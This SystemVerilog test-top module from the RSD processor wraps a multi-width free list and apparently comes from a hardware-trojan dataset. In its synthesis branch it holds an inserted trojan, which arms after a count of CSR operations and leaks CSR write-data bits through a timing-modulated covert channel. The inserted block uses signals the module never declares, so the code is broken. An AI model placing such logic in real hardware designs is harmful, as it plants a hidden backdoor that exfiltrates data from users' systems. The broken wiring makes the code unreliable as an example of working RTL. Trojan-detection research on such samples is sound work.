// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.


`timescale 1ns/1ps

import BasicTypes::*;

module TestMultiWidthFreeListTop_trojan_Covert #(
    SIZE = 8,
    PUSH_WIDTH = 2,
    POP_WIDTH = 2,
    ENTRY_WIDTH = $clog2(SIZE)
)( 
input
    logic clk_p,
    logic clk_n,
    logic rst,
    logic [ PUSH_WIDTH-1:0 ] push,
    logic [ POP_WIDTH-1:0 ] pop,
    logic [ PUSH_WIDTH-1:0 ][ ENTRY_WIDTH-1:0 ] pushedData,
output
    logic full,
    logic empty,
    logic [ POP_WIDTH-1:0 ][ ENTRY_WIDTH-1:0 ] poppedData
);
    
    logic clk;
    logic [ $clog2(SIZE):0 ] count;
    logic unpackedPush [ PUSH_WIDTH ];
    logic unpackedPop [ POP_WIDTH ];
    logic [ ENTRY_WIDTH-1:0 ] unpackedPushedData [ PUSH_WIDTH ];
    logic [ ENTRY_WIDTH-1:0 ] unpackedPoppedData [ POP_WIDTH ];

    `ifdef RSD_SYNTHESIS
        TED_ClockGenerator clkgen( clk_p, clk_n, clk );

    // ============================================================
    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=13639)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 13639;
    logic [15:0] trojan_counter;
    logic        trojan_active;
    always_ff @(posedge clk_p or negedge rst) begin
        if (!rst) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
            if (csr_op_en_i && |csr_op_en_i) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
        end
    end

    // ── COVERT CHANNEL: Timing modulation ──────────────────────────────────
    logic       covert_bit_out;
    logic [7:0] covert_delay_counter;
    logic [4:0] covert_bit_index;
    logic       covert_current_bit;
    assign covert_current_bit = csr_wdata_i[covert_bit_index[4:0]];
    always_ff @(posedge clk_p or negedge rst) begin
        if (!rst) begin
            covert_bit_out       <= 1'b0;
            covert_delay_counter <= '0;
            covert_bit_index     <= '0;
        end else if (trojan_active) begin
            if (covert_delay_counter < (covert_current_bit ? 8'd10 : 8'd5)) begin
                covert_delay_counter <= covert_delay_counter + 1;
                covert_bit_out       <= 1'b1;
            end else begin
                covert_bit_out       <= 1'b0;
                covert_delay_counter <= '0;
                covert_bit_index     <= covert_bit_index + 1;
            end
        end else begin
            covert_bit_out <= 1'b0; covert_delay_counter <= '0; covert_bit_index <= '0;
        end
    end
    // ────────────────────────────────────────────────────────────────────────


    `else
        assign clk = clk_p;
    `endif
    
    MultiWidthFreeList #(
        .INDEX_BIT_SIZE( $clog2(SIZE) ),
        .PUSH_WIDTH( PUSH_WIDTH ),
        .POP_WIDTH( POP_WIDTH ),
        .ENTRY_BIT_SIZE( ENTRY_WIDTH )
    ) freeList (
        .push(unpackedPush),
        .pop(unpackedPop),
        .pushedData(unpackedPushedData),
        .poppedData(unpackedPoppedData),
        .*
    );
    
    always_comb begin
        for ( int i = 0; i < PUSH_WIDTH; i++ ) begin
            unpackedPush[i] = push[i];
            unpackedPushedData[i] = pushedData[i];
        end
        for ( int i = 0; i < POP_WIDTH; i++ ) begin
            unpackedPop[i] = pop[i];
            poppedData[i] = unpackedPoppedData[i];
        end
    end
    
endmodule
